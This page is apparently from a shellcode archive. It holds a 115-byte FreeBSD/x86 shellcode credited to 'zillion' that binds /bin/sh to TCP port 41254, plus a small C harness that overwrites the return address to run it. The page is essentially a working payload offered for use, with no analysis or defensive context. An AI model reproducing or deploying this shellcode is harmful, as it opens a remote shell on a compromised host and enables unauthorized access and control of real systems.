<html><head><title>FreeBSD/x86 - bind sh port 41254 - 115 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>

/*

 FreeBSD shellcode that binds /bin/sh to port 41254
 Assembly code and explanation will be released on safemode.org soon.

 Written by zillion (zillion at safemode.org)

*/

char shellcode[] =
        &quot;\xeb\x64\x5e\x31\xc0\x88\x46\x07\x6a\x06\x6a\x01\x6a\x02\xb0&quot;
        &quot;\x61\x50\xcd\x80\x89\xc2\x31\xc0\xc6\x46\x09\x02\x66\xc7\x46&quot;
        &quot;\x0a\xa1\x26\x89\x46\x0c\x6a\x10\x8d\x46\x08\x50\x52\x31\xc0&quot;
        &quot;\xb0\x68\x50\xcd\x80\x6a\x01\x52\x31\xc0\xb0\x6a\x50\xcd\x80&quot;
        &quot;\x31\xc0\x50\x50\x52\xb0\x1e\x50\xcd\x80\xb1\x03\xbb\xff\xff&quot;
        &quot;\xff\xff\x89\xc2\x43\x53\x52\xb0\x5a\x50\xcd\x80\x80\xe9\x01&quot;
        &quot;\x75\xf3\x31\xc0\x50\x50\x56\xb0\x3b\x50\xcd\x80\xe8\x97\xff&quot;
        &quot;\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23&quot;;

int main()
{

  int *ret;
  ret = (int *)&amp;ret + 2;
  (*ret) = (int)shellcode;
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
